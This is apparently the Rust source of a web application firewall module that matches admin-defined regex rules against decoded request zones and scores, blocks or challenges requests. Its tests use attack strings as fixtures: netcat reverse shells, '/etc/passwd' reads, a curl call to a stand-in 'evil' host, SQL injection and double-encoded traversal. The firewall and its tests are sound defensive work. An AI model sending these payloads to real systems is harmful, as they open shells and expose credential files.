// =========================================================
// modules/waf.rs — EasyWAF
// WAF inspection module.
//
// For every proxied request this module:
//   1. Looks up the WAF policy assigned to the site.
//   2. Loads all enabled rules for that policy from the DB.
//   3. Matches each rule's regex against the configured zone
//      (URL, ARGS, BODY, HEADERS, or ALL of the above).
//   4. Instant-blocks on action='block' rules.
//   5. Accumulates scores; blocks when total >= score_threshold.
//
// rule_engine modes:
//   Off          — skip all checks, always Pass
//   DetectionOnly — run checks but Alert instead of Drop
//   On           — full enforcement, Drop when threshold exceeded
//
// The regex crate uses a safe automata engine — no ReDoS risk.
//
// Patterns are compiled once and cached on the module (see
// compiled_pattern), not per request: the rule set is read
// from the DB on every request, and compiling ~100 patterns
// per request dominated the cost of matching them.
// =========================================================

use crate::modules::{Findings, RuleHit, InspectionModule, ModuleDecision, RequestContext};
use async_trait::async_trait;
use axum::http::StatusCode;
use regex::Regex;
use sqlx::SqlitePool;
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

// ─── WafModule ───────────────────────────────────────────

/// Pipeline module that evaluates WAF rules for every request.
pub struct WafModule {
    db: SqlitePool,
    /// Compiled patterns, keyed by the pattern source text.
    ///
    /// `None` marks a pattern that failed to compile, so a broken rule is
    /// reported once instead of on every request. Keying by the pattern rather
    /// than the rule id means an edited rule compiles its new pattern on next
    /// use with no explicit invalidation. The key space is admin-controlled
    /// (rules come from the GUI, never from request data), so it stays small.
    regex_cache: RwLock<HashMap<String, Option<Arc<Regex>>>>,
}

impl WafModule {
    /// Create a WafModule backed by the given connection pool.
    pub fn new(db: SqlitePool) -> Self {
        Self {
            db,
            regex_cache: RwLock::new(HashMap::new()),
        }
    }

    /// Return the compiled regex for a rule's pattern, compiling on first use.
    ///
    /// Returns None when the pattern is invalid; that outcome is cached too, so
    /// an unusable rule costs one failed compile and one log line for the life
    /// of the process rather than one per request.
    ///
    /// Two requests can race and compile the same pattern twice — harmless,
    /// since both produce the same value and the second insert simply wins. No
    /// lock is held across an await point.
    fn compiled_pattern(&self, rule: &RuleRow) -> Option<Arc<Regex>> {
        // Fast path — already compiled, or already known to be invalid.
        if let Ok(cache) = self.regex_cache.read() {
            if let Some(entry) = cache.get(&rule.pattern) {
                return entry.clone();
            }
        }

        // Slow path — compile once and remember the outcome either way.
        let compiled = match Regex::new(&rule.pattern) {
            Ok(re) => Some(Arc::new(re)),
            Err(e) => {
                tracing::warn!(
                    rule_id = rule.id,
                    pattern = %rule.pattern,
                    "WAF rule has invalid regex, skipping: {}",
                    e
                );
                None
            }
        };

        if let Ok(mut cache) = self.regex_cache.write() {
            cache.insert(rule.pattern.clone(), compiled.clone());
        }
        compiled
    }
}

// ─── Internal DB row types ───────────────────────────────

/// Policy configuration fetched per request.
struct PolicyInfo {
    id:                  i64,
    rule_engine:         String,
    score_threshold:     i64,
    challenge_threshold: i64,
}

/// Severity of a WAF decision before the rule_engine mode is applied.
enum Level {
    Challenge,
    Block,
}

/// A single WAF rule loaded from the DB.
struct RuleRow {
    id:      i64,
    /// The catalogue number, when the rule came from a rule set. Custom rules
    /// have none, which is why it is optional rather than defaulted to zero.
    external_id: Option<i64>,
    name:    String,
    zone:    String,
    pattern: String,
    score:   i64,
    action:  String,
}

// ─── InspectionModule impl ───────────────────────────────

#[async_trait]
impl InspectionModule for WafModule {
    fn name(&self) -> &'static str { "waf" }

    /// Evaluate all enabled rules for this request's policy.
    /// Returns Pass, Alert (DetectionOnly), or Drop (rule_engine=On).
    async fn inspect(&self, ctx: &RequestContext) -> ModuleDecision {
        // Step 1 — get the policy assigned to this site.
        let policy = match get_site_policy(&self.db, ctx.site_id).await {
            Some(p) => p,
            None    => return ModuleDecision::Pass, // no policy, skip WAF
        };

        // Step 2 — honour the rule_engine mode.
        if policy.rule_engine == "Off" {
            return ModuleDecision::Pass;
        }

        // Step 3 — load enabled rules.
        let rules = get_rules(&self.db, policy.id).await;
        if rules.is_empty() {
            return ModuleDecision::Pass;
        }

        // Step 4 — build zone content forms from the request.
        // Each zone is a small list of candidate strings — raw, then
        // percent-decoded — matched independently rather than concatenated.
        // Concatenating would need a separator character, and a separator is
        // exactly the kind of thing a rule can accidentally match: an earlier
        // version joined forms with '\n' and a CRLF-detection rule matched
        // that '\n' on any request carrying a percent-encoded header, having
        // nothing to do with anything the client sent. See zone_text.
        let raw_url = format!("{}{}", ctx.path, ctx.query.as_deref().unwrap_or(""));
        let url     = zone_text(&raw_url, true);
        let args    = zone_text(ctx.query.as_deref().unwrap_or(""), true);
        let body    = zone_text(&String::from_utf8_lossy(&ctx.body), true);
        let headers = zone_text(
            &ctx.headers
                .values()
                .filter_map(|v| v.to_str().ok())
                .collect::<Vec<_>>()
                .join(" "),
            false,
        );
        // "ANY" is every form from every zone — still no concatenation, so a
        // zone boundary can never masquerade as content either.
        let any: Vec<&str> = url.iter().chain(&args).chain(&body).chain(&headers)
            .map(String::as_str)
            .collect();

        // Step 5 — evaluate each rule in order.
        let mut total_score: i64 = 0;
        let mut challenge_reason: Option<String> = None;
        // Every rule that matched, in the order it did, so the traffic record
        // can say what produced the score rather than only what it came to.
        let mut hits: Vec<RuleHit> = Vec::new();

        for rule in &rules {
            // Select the candidate forms for this rule's zone. A rule matches
            // if it matches ANY one form — never a concatenation of them.
            let targets: Vec<&str> = match rule.zone.as_str() {
                "URL"     => url.iter().map(String::as_str).collect(),
                "ARGS"    => args.iter().map(String::as_str).collect(),
                "BODY"    => body.iter().map(String::as_str).collect(),
                "HEADERS" => headers.iter().map(String::as_str).collect(),
                _         => any.clone(),  // "ANY" or unrecognised
            };

            // Compiled on first use and cached; skip a rule whose pattern
            // could not be compiled.
            let re = match self.compiled_pattern(rule) {
                Some(r) => r,
                None    => continue,
            };

            if !targets.iter().any(|t| re.is_match(t)) {
                continue;
            }

            tracing::debug!(
                rule    = %rule.name,
                zone    = %rule.zone,
                score   = rule.score,
                action  = %rule.action,
                "WAF rule matched"
            );

            hits.push(RuleHit {
                id:    rule.external_id,
                name:  rule.name.clone(),
                // An instant-block rule carries its own weight rather than a
                // score, so it is reported at the threshold it forced.
                score: if rule.action == "block" { policy.score_threshold } else { rule.score },
            });

            match rule.action.as_str() {
                // Instant block regardless of score — block always wins, so
                // we can decide right here.
                "block" => {
                    let score = policy.score_threshold;
                    return decide(
                        &policy,
                        Level::Block,
                        format!("WAF block rule matched: {}", rule.name),
                        Findings { score, hits },
                    );
                }
                // Direct challenge request — remember it but keep scanning, so
                // a later block rule can still take precedence.
                "challenge" => {
                    if challenge_reason.is_none() {
                        challenge_reason =
                            Some(format!("WAF challenge rule matched: {}", rule.name));
                    }
                }
                // Default "score" — accumulate.
                _ => { total_score += rule.score; }
            }
        }

        // Step 6 — apply thresholds. Block takes precedence over challenge.
        if total_score >= policy.score_threshold {
            return decide(
                &policy,
                Level::Block,
                format!("WAF score {} ≥ block threshold {}", total_score, policy.score_threshold),
                Findings { score: total_score, hits },
            );
        }

        if let Some(reason) = challenge_reason {
            return decide(&policy, Level::Challenge, reason,
                          Findings { score: total_score, hits });
        }

        if policy.challenge_threshold > 0 && total_score >= policy.challenge_threshold {
            return decide(
                &policy,
                Level::Challenge,
                format!("WAF score {} ≥ challenge threshold {}", total_score, policy.challenge_threshold),
                Findings { score: total_score, hits },
            );
        }

        ModuleDecision::Pass
    }
}

// ─── Zone text ───────────────────────────────────────────

/// Build the candidate forms a rule is matched against: the request text as
/// received, and its percent-decoded equivalents.
///
/// Attack payloads arrive percent-encoded far more often than not — a browser
/// encodes the spaces in `DROP TABLE users` without being asked — and matching
/// the raw text alone meant every pattern containing `\s` missed them: the same
/// payload that blocked instantly in a request body sailed through in a query
/// string.
///
/// The forms are matched independently by the caller rather than concatenated
/// into one string. Concatenation needs a separator, and a separator is
/// exactly the kind of text a rule can accidentally match — a CRLF-detection
/// rule once matched the '\n' this function used to join forms with, on any
/// request carrying a percent-encoded header, which had nothing to do with
/// what the client sent. Returning the forms separately makes that whole class
/// of bug impossible rather than relocating it to a different separator.
///
/// The raw form is kept alongside the decoded ones rather than replaced.
/// Several rules deliberately look for the encoding itself — `%252e%252e`,
/// `%00`, the double-URL-encoding protocol rule — so decoding in place would
/// trade one blind spot for another. Decoding runs twice so double-encoded
/// payloads reduce to plain text as well.
///
/// `plus_is_space` suits query strings and form bodies, where `+` encodes a
/// space. It is wrong for a path, where `+` is a literal character.
///
/// A single-element result costs only the scan for `%` — this runs per
/// request, and bodies reach 32 MB — when the text carries no encoding.
fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
    let has_pct  = raw.contains('%');
    let has_plus = plus_is_space && raw.contains('+');
    if !has_pct && !has_plus {
        return vec![raw.to_string()];
    }

    let mut forms = vec![raw.to_string()];

    // '+' means space in a query string, and must be substituted before
    // percent-decoding rather than after, or "%2B" would become a space too.
    let base = if has_plus { raw.replace('+', " ") } else { raw.to_string() };
    if base != raw {
        forms.push(base.clone());
    }

    let once = percent_decode(&base);
    if once != base {
        forms.push(once.clone());
    }

    let twice = percent_decode(&once);
    if twice != once {
        forms.push(twice);
    }

    forms
}

/// Percent-decode one string, returning it unchanged when it is not valid
/// encoding or does not decode to UTF-8. A malformed payload is still matched
/// in its raw form by the caller.
fn percent_decode(s: &str) -> String {
    urlencoding::decode(s)
        .map(|c| c.into_owned())
        .unwrap_or_else(|_| s.to_string())
}

// ─── decide ──────────────────────────────────────────────

/// Map a decision Level to a ModuleDecision, applying the rule_engine mode.
/// In DetectionOnly mode nothing is enforced — every decision becomes an Alert.
fn decide(
    policy: &PolicyInfo,
    level: Level,
    reason: String,
    findings: Findings,
) -> ModuleDecision {
    // DetectionOnly still reports what matched. Seeing which rules would have
    // fired is the entire point of running a policy in that mode.
    if policy.rule_engine == "DetectionOnly" {
        return ModuleDecision::Alert { reason, findings };
    }
    match level {
        Level::Challenge => ModuleDecision::Challenge { reason, findings },
        Level::Block     => {
            ModuleDecision::Drop { reason, status: StatusCode::FORBIDDEN, findings }
        }
    }
}

// ─── DB helpers ──────────────────────────────────────────

/// Fetch the WAF policy assigned to a site.
/// Returns None if the site has no policy (waf_policy_id IS NULL).
async fn get_site_policy(db: &SqlitePool, site_id: i64) -> Option<PolicyInfo> {
    sqlx::query!(
        "SELECT p.id                  as \"id!\",
                p.rule_engine,
                p.score_threshold     as \"score_threshold!\",
                p.challenge_threshold as \"challenge_threshold!\"
         FROM   policies p
         JOIN   sites    s ON s.waf_policy_id = p.id
         WHERE  s.id = ?",
        site_id
    )
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .map(|r| PolicyInfo {
        id:                  r.id,
        rule_engine:         r.rule_engine,
        score_threshold:     r.score_threshold,
        challenge_threshold: r.challenge_threshold,
    })
}

/// Fetch all enabled rules for a policy, ordered by id.
async fn get_rules(db: &SqlitePool, policy_id: i64) -> Vec<RuleRow> {
    let rows = sqlx::query!(
        "SELECT id       as \"id!\",
                external_id,
                name,
                zone,
                pattern,
                score    as \"score!\",
                action
         FROM   waf_rules
         WHERE  policy_id = ? AND enabled = 1
         ORDER  BY id",
        policy_id
    )
    .fetch_all(db)
    .await
    .unwrap_or_default();

    rows.into_iter()
        .map(|r| RuleRow {
            id:          r.id,
            external_id: r.external_id,
            name:        r.name,
            zone:    r.zone,
            pattern: r.pattern,
            score:   r.score,
            action:  r.action,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use regex::Regex;

    /// Pull one rule's pattern out of the shipped catalog, so the test checks
    /// what actually loads rather than a copy that can drift from it.
    fn pattern(file: &str, id: u32) -> String {
        let text = std::fs::read_to_string(format!("rules/{file}"))
            .unwrap_or_else(|e| panic!("rules/{file}: {e}"));
        for block in text.split("[[rules]]").skip(1) {
            if !block.contains(&format!("id          = {id}")) {
                continue;
            }
            for line in block.lines() {
                if let Some(rest) = line.trim().strip_prefix("pattern     = ") {
                    return rest.trim().trim_matches('\'').to_string();
                }
            }
        }
        panic!("rule {id} not found in rules/{file}");
    }

    #[test]
    fn command_chaining_ignores_names_that_merely_start_with_a_command() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();

        // A Cookie header is semicolon-separated by definition, so these are
        // ordinary traffic. "nc" matching the "nc" of "nc_token" scored 8 of a
        // threshold of 10 on every request an application like Nextcloud made.
        for benign in [
            "oc_sessionPassphrase=abc; nc_token=xyz",
            "a=1; nc_username=yariv",
            "session=1; identity=bob",
            "x=1; catalogue=shoes",
            "x=1; lsp_id=42",
            "x=1; shop_cart=3",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }
    }

    #[test]
    fn command_chaining_still_catches_the_real_thing() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();
        for attack in [
            "; nc -e /bin/sh 10.0.0.1",
            "; ls -la",
            "| cat /etc/passwd",
            "; whoami",
            "`id`",
            ";curl http://evil/x",
            "; netcat 10.0.0.1 4444",
        ] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn double_encoding_means_an_encoded_percent_not_two_escapes() {
        let re = Regex::new(&pattern("920-protocol.rules.toml", 920002)).unwrap();

        // Two escapes in a row is ordinary URL encoding, not an attack. Any
        // character outside ASCII produces several, so this used to score
        // every request carrying a non-English filename.
        for benign in [
            "requesttoken=abc%3D%3Adef%3D",
            "/files/%D7%AA%D7%9E%D7%95%D7%A0%D7%94.jpg",
            "/files/caf%C3%A9.txt",
            "/files/%F0%9F%93%81.png",
            "/x?q=hello%20%22world%22",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }

        // A percent that has itself been encoded is the real thing.
        for attack in ["%253Cscript%253E", "%252e%252e%252f", "%%3C"] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn the_sql_comment_rule_ignores_a_mime_wildcard() {
        let re = Regex::new(&pattern("942-sqli.rules.toml", 942007)).unwrap();
        // Every HTTP client sends this by default.
        assert!(!re.is_match("*/*"));
        assert!(!re.is_match("text/html, */*;q=0.8"));
        // Still catches comments used to truncate a query.
        assert!(re.is_match("' OR 1=1 --"));
        assert!(re.is_match("UNION/**/SELECT"));
    }
}
